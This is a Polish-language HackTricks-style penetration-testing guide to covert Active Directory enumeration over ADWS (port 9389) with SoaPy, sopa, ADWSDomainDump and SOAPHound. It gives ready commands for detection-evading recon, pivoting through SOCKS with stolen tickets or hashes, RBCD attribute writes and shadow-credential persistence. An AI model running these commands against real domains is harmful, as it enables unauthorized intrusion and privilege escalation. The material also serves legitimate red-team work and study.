# Enumeracja Active Directory Web Services (ADWS) i ukryte zbieranie danych

{{#include ../../banners/hacktricks-training.md}}

## Czym jest ADWS?

Active Directory Web Services (ADWS) jest **domyślnie włączona na każdym kontrolerze domeny od Windows Server 2008 R2** i nasłuchuje na TCP **9389**. Mimo nazwy **nie jest używany protokół HTTP**. Zamiast tego usługa udostępnia dane w stylu LDAP za pośrednictwem stosu zastrzeżonych protokołów ramkowania .NET:<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Ponieważ ruch jest enkapsulowany w binarnych ramkach SOAP i przesyłany przez rzadko używany port, **enumeracja przez ADWS jest znacznie mniej narażona na inspekcję, filtrowanie lub wykrycie przez sygnatury niż ruch klasycznego LDAP na portach 389 i 636**. Dla operatorów oznacza to:<sup>[[1]](#references)[[7]](#references)</sup>

* Bardziej ukryty rekonesans – zespoły Blue Team często koncentrują się na zapytaniach LDAP.
* Możliwość zbierania danych z **hostów innych niż Windows (Linux, macOS)** przez tunelowanie ruchu 9389/TCP przez proxy SOCKS.
* Te same dane, które można uzyskać przez LDAP (użytkownicy, grupy, ACL, schemat itd.), oraz możliwość wykonywania **zapisów** (np. `msDs-AllowedToActOnBehalfOfOtherIdentity` dla **RBCD**).

Interakcje z ADWS są realizowane przez WS-Enumeration: każde zapytanie rozpoczyna się komunikatem `Enumerate`, który definiuje filtr/atrybuty LDAP i zwraca GUID `EnumerationContext`, po czym następuje jeden lub więcej komunikatów `Pull` przesyłających wyniki w porcjach o wielkości określonej przez serwer.<sup>[[7]](#references)</sup> Konteksty wygasają po około 30 minutach, więc narzędzia muszą albo stronicować wyniki, albo dzielić filtry (zapytania według prefiksu dla poszczególnych CN), aby nie utracić stanu.<sup>[[8]](#references)</sup> Przy pobieraniu deskryptorów zabezpieczeń należy określić kontrolkę `LDAP_SERVER_SD_FLAGS_OID`, aby pominąć SACL; w przeciwnym razie ADWS po prostu pomija atrybut `nTSecurityDescriptor` w odpowiedzi SOAP.

> UWAGA: ADWS jest również używana przez wiele narzędzi RSAT z GUI i PowerShell, więc ruch może przypominać legalną aktywność administratorów.

## SoaPy – natywny klient Python

[SoaPy](https://github.com/logangoins/soapy) to **pełna implementacja stosu protokołu ADWS napisana w czystym Pythonie**. Tworzy ramki NBFX/NBFSE/NNS/NMF bajt po bajcie, umożliwiając zbieranie danych z systemów uniksopodobnych bez użycia środowiska uruchomieniowego .NET.<sup>[[1]](#references)[[2]](#references)</sup>

### Najważniejsze funkcje

* Obsługa **połączeń przez proxy SOCKS** (przydatna w przypadku implantów C2).
* Szczegółowe filtry wyszukiwania identyczne z LDAP, np. `-q '(objectClass=user)'`.
* Ukierunkowane operacje **zapisu** dla RBCD, SPN, flag kont i poświadczeń kluczy.<sup>[[2]](#references)</sup>
* Dane wyjściowe SOAPy można przetwarzać za pomocą **BOFHound** i importować do BloodHound.<sup>[[2]](#references)[[3]](#references)</sup>
* Flaga `--parse` formatująca znaczniki czasu / `userAccountControl`, gdy wymagana jest czytelna dla człowieka postać danych.<sup>[[2]](#references)</sup>

### Flagi ukierunkowanego zbierania danych i operacje zapisu

SoaPy zawiera zestaw wyselekcjonowanych przełączników, które odtwarzają najczęstsze zadania LDAP huntingu za pośrednictwem ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, a także opcje `--query` / `--filter` do niestandardowego pobierania danych. Można je łączyć z prymitywami zapisu, takimi jak `--rbcd <source>` (ustawia `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (konfiguracja SPN na potrzeby ukierunkowanego Kerberoastingu) oraz `--asrep` (ustawia `DONT_REQ_PREAUTH` w `userAccountControl`).<sup>[[2]](#references)</sup>

Przykład ukierunkowanego wyszukiwania SPN, które zwraca tylko `samAccountName` i `servicePrincipalName`:

```bash
SOAPy corp.local/alice:'Winter2025!'@dc01.corp.local \
      --spns -f samAccountName,servicePrincipalName --parse
```

Użyj tego samego hosta/danych uwierzytelniających, aby natychmiast wykorzystać ustalenia: wyświetl obiekty z już skonfigurowanym RBCD za pomocą `--rbcds`, a następnie zastosuj `--rbcd add --rbcd-source 'WEBSRV01$' --rbcd-target 'FILE01$'`, aby przygotować łańcuch Resource-Based Constrained Delegation (pełną ścieżkę nadużycia opisano w sekcji [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).<sup>[[2]](#references)</sup>

### Instalacja (host operatora)

Zainstaluj aktualną wersję CLI SOAPy z repozytorium upstream; nazwa pliku wykonywalnego rozróżnia wielkość liter w systemach uniksopodobnych.<sup>[[2]](#references)[[9]](#references)</sup>

```bash
pipx install git+https://github.com/logangoins/SOAPy
```

### Zbieranie wyłącznie na podstawie ticketu przez pivot SOCKS

Jeśli foothold zapewnia ticket Kerberos, ale nie hasło w postaci jawnej, przekonwertuj ticket `.kirbi` na `ccache`, jak opisano w sekcji [Pass the Ticket](pass-the-ticket.md), a następnie wskaż ten cache w SOAPy. Ticket dla usługi LDAP kontrolera domeny może być użyty w udokumentowanym workflow SOAPy ADWS; przekieruj przez pivot zarówno ruch ADWS, jak i Kerberos.<sup>[[9]](#references)</sup>

```bash
KRB5CCNAME=ticket.ccache proxychains4 SOAPy -k \
  corp.local/alice@dc01.corp.local -q '(objectClass=computer)'
```

### Shadow credentials przez ADWS

Jeśli bieżący principal może zapisywać atrybut `msDS-KeyCredentialLink` obiektu docelowego, SOAPy może dodać poświadczenie klucza przez ADWS i wyeksportować odpowiadający mu plik PFX. Zapisz zwrócony DeviceID, aby precyzyjnie usunąć poświadczenie, zamiast czyścić cały atrybut. Użyj pliku PFX do PKINIT, zgodnie z opisem w [Shadow Credentials](acl-persistence-abuse/shadow-credentials.md).<sup>[[10]](#references)</sup>

```bash
SOAPy corp.local/alice:'<PASSWORD>'@dc01.corp.local \
  --shadow-creds add --shadow-target targetuser
# After use, remove only the DeviceID returned by the add action:
SOAPy corp.local/alice:'<PASSWORD>'@dc01.corp.local \
  --shadow-creds remove --shadow-target targetuser --device-id '<DEVICE_ID>'
```

## ADWSDomainDump – LDAPDomainDump przez ADWS (Linux/Windows)

* Fork `ldapdomaindump`, który zastępuje zapytania LDAP wywołaniami ADWS przez TCP/9389, aby ograniczyć wykrycia sygnatur LDAP.
* Wykonuje wstępne sprawdzenie dostępności portu 9389, chyba że podano `--force` (pomija test, jeśli skanowanie portów jest głośne lub filtrowane).
* W README opisano udane ominięcie zabezpieczeń Microsoft Defender for Endpoint i CrowdStrike Falcon.<sup>[[4]](#references)</sup>

### Instalacja

```bash
pipx install .
```

### Użycie

```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```

Typowe logi wyjściowe odnotowują sprawdzenie dostępności portu 9389, ADWS bind oraz rozpoczęcie i zakończenie zrzutu:

```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

## Sopa - praktyczny klient ADWS w Golang

Podobnie jak soapy, [sopa](https://github.com/Macmod/sopa) implementuje stos protokołów ADWS (MS-NNS + MC-NMF + SOAP) w Golang i udostępnia flagi wiersza poleceń do wykonywania wywołań ADWS, takich jak:<sup>[[5]](#references)</sup>

* **Wyszukiwanie i pobieranie obiektów** - `query` / `get`
* **Cykl życia obiektów** - `create [user|computer|group|ou|container|custom]` i `delete`
* **Edycja atrybutów** - `attr [add|replace|delete]`
* **Zarządzanie kontami** - `set-password` / `change-password`
* oraz inne, takie jak `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]` itd.

### Najważniejsze informacje o mapowaniu protokołów

* Wyszukiwania w stylu LDAP są wykonywane za pośrednictwem **WS-Enumeration** (`Enumerate` + `Pull`) z projekcją atrybutów, kontrolą zakresu (Base/OneLevel/Subtree) i paginacją.
* Pobieranie pojedynczego obiektu wykorzystuje **WS-Transfer** `Get`; zmiany atrybutów — `Put`; usuwanie — `Delete`.
* Wbudowane tworzenie obiektów wykorzystuje **WS-Transfer ResourceFactory**; obiekty niestandardowe używają **IMDA AddRequest** opartego na szablonach YAML.
* Operacje na hasłach to akcje **MS-ADCAP** (`SetPassword`, `ChangePassword`).<sup>[[5]](#references)</sup>

### Odkrywanie metadanych bez uwierzytelniania (mex)

ADWS udostępnia WS-MetadataExchange bez poświadczeń, co pozwala szybko sprawdzić, czy usługa jest dostępna, zanim nastąpi uwierzytelnienie:<sup>[[5]](#references)</sup>

```bash
sopa mex --dc <DC>
```

### Uwagi dotyczące wykrywania DNS/DC i kierowania Kerberos

Sopa może wyszukiwać kontrolery domeny (DC) za pomocą rekordów SRV, jeśli pominięto `--dc` i podano `--domain`. Wykonuje zapytania w tej kolejności i używa celu o najwyższym priorytecie:<sup>[[5]](#references)</sup>

```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```

Operacyjnie preferuj resolver kontrolowany przez DC, aby uniknąć błędów w segmentowanych środowiskach:

* Użyj `--dns <DC-IP>`, aby wszystkie zapytania SRV/PTR/forward przechodziły przez DNS DC.
* Użyj `--dns-tcp`, gdy UDP jest blokowane lub odpowiedzi SRV są duże.
* Jeśli `--dc` jest adresem IP, sopa zawsze wykonuje zapytanie **reverse PTR**: filtr adresu `wsa:To` w ADWS wymaga FQDN, nawet bez Kerberos. Jeśli brakuje strefy reverse, podaj bezpośrednio FQDN DC.<sup>[[5]](#references)</sup>

Przykład (IP + Kerberos, wymuszone DNS przez DC):

```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```

### Opcje materiałów uwierzytelniających

Oprócz haseł w postaci jawnego tekstu sopa obsługuje **hashe NT**, **klucze Kerberos AES**, **ccache** oraz **certyfikaty PKINIT** (PFX lub PEM) na potrzeby uwierzytelniania ADWS. Użycie `--aes-key`, `-c` (ccache) lub opcji opartych na certyfikatach oznacza uwierzytelnianie Kerberos.<sup>[[5]](#references)</sup>

```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```

### Tworzenie niestandardowych obiektów za pomocą szablonów

W przypadku dowolnych klas obiektów polecenie `create custom` przyjmuje szablon YAML mapowany na `AddRequest` IMDA:<sup>[[5]](#references)</sup>

* `parentDN` i `rdn` określają kontener i względny DN.
* `attributes[].name` obsługuje `cn` lub namespaced `addata:cn`.
* `attributes[].type` przyjmuje `string|int|bool|base64|hex` lub jawne `xsd:*`.
* **Nie** dołączaj `ad:relativeDistinguishedName` ani `ad:container-hierarchy-parent`; sopa wstawia je automatycznie.
* Wartości `hex` są konwertowane na `xsd:base64Binary`; użyj `value: ""`, aby ustawić pusty ciąg.

## SOAPHound – zbieranie danych ADWS na dużą skalę (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) to kolektor .NET, który przeprowadza wszystkie interakcje LDAP za pośrednictwem ADWS i generuje pliki JSON zgodne z BloodHound v4. Najpierw tworzy pełną pamięć podręczną `objectSid`, `objectGUID`, `distinguishedName` i `objectClass` (`--buildcache`), a następnie wykorzystuje ją ponownie podczas zrzutów na dużą skalę `--bhdump`, `--certdump` (ADCS) lub `--dnsdump` (DNS zintegrowany z AD), dzięki czemu z kontrolera domeny opuszcza go tylko około 35 krytycznych atrybutów. AutoSplit (`--autosplit --threshold <N>`) automatycznie dzieli zapytania według prefiksu CN, aby nie przekroczyć 30-minutowego limitu czasu EnumerationContext w dużych lasach.<sup>[[8]](#references)</sup>

Typowy przepływ pracy na maszynie wirtualnej operatora dołączonej do domeny:

```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump --autosplit --threshold 1200 --nolaps -o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```

Eksportowane sloty JSON trafiają bezpośrednio do workflowów SharpHound/BloodHound — zobacz [metodologię BloodHound](bloodhound.md), aby poznać pomysły na dalszą wizualizację grafów. AutoSplit zwiększa odporność SOAPHound na lasy zawierające miliony obiektów, jednocześnie ograniczając liczbę zapytań w porównaniu ze snapshotami w stylu ADExplorer.

## Dyskretne workflow zbierania danych AD

Poniższy workflow pokazuje, jak enumerować **obiekty domeny i ADCS** przez ADWS, konwertować je do formatu JSON BloodHound i wyszukiwać ścieżki ataku oparte na certyfikatach — wszystko z poziomu Linuxa:

1. **Przekieruj tunel 9389/TCP** z sieci docelowej do swojego komputera (np. za pomocą Chisel, Meterpreter, dynamicznego przekierowania portów SSH itp.). Przekieruj surowego klienta TCP przez SOCKS za pomocą `proxychains4 SOAPy ...` (skonfiguruj adres SOCKS5 w `proxychains4.conf`); `HTTPS_PROXY` nie obsługuje tego protokołu, ponieważ nie jest on oparty na HTTP.<sup>[[9]](#references)</sup>

2. **Zbierz obiekt domeny głównej:**

```bash
proxychains4 SOAPy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -q '(objectClass=domain)' \
      | tee data/domain.log
```

3. **Zbierz obiekty związane z ADCS z Configuration NC:**

```bash
proxychains4 SOAPy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -dn 'CN=Configuration,DC=ludus,DC=domain' \
      -q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority)(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
      | tee data/adcs.log
```

4. **Konwersja do BloodHound:**

```bash
bofhound -i data --zip   # produces BloodHound.zip
```

5. **Prześlij ZIP** w GUI BloodHound i uruchom zapytania cypher, takie jak `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c`, aby ujawnić ścieżki eskalacji uprawnień związane z certyfikatami (ESC1, ESC8 itd.).

### Zapis `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)

Mając dostęp do zapisu obiektu komputera docelowego, użyj akcji RBCD w SOAPy zamiast surowego ciągu deskryptora zabezpieczeń. W tym przypadku `WEBSRV01$` jest kontrolowanym źródłem, a `FILE01$` jest celem, którego atrybut zostanie zmieniony.<sup>[[2]](#references)</sup>

```bash
SOAPy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
      --rbcd add --rbcd-source 'WEBSRV01$' --rbcd-target 'FILE01$'
```

Kontynuuj łańcuch Kerberos S4U w [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md).

## Podsumowanie narzędzi

| Cel | Narzędzie | Uwagi |
|---------|------|-------|
| Enumeracja ADWS | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, odczyt/zapis |
| Zrzut ADWS na dużą skalę | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, tryby BH/ADCS/DNS |
| Import danych do BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Konwertuje logi SoaPy/ldapsearch |
| Kompromitacja certyfikatu | [Certipy](https://github.com/ly4k/Certipy) | Można przekierować przez ten sam SOCKS |
| Enumeracja ADWS i zmiany obiektów | [sopa](https://github.com/Macmod/sopa) | Uniwersalny klient do komunikacji ze znanymi endpointami ADWS — umożliwia enumerację, tworzenie obiektów, modyfikację atrybutów i zmianę haseł |



## References

- [1] [SpecterOps – Pamiętaj, aby używać SOAP(y) – poradnik operatora dotyczący skrytego zbierania danych AD za pomocą ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – specyfikacje MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – Skryta enumeracja środowisk Active Directory za pomocą ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – Narzędzie SOAPHound do zbierania danych Active Directory za pomocą ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
- [9] [Wiki SOAPy – Recon](https://github.com/logangoins/SOAPy/wiki/Recon)
- [10] [Wiki SOAPy – Post-Exploitation](https://github.com/logangoins/SOAPy/wiki/Post%E2%80%90Exploitation)
{{#include ../../banners/hacktricks-training.md}}
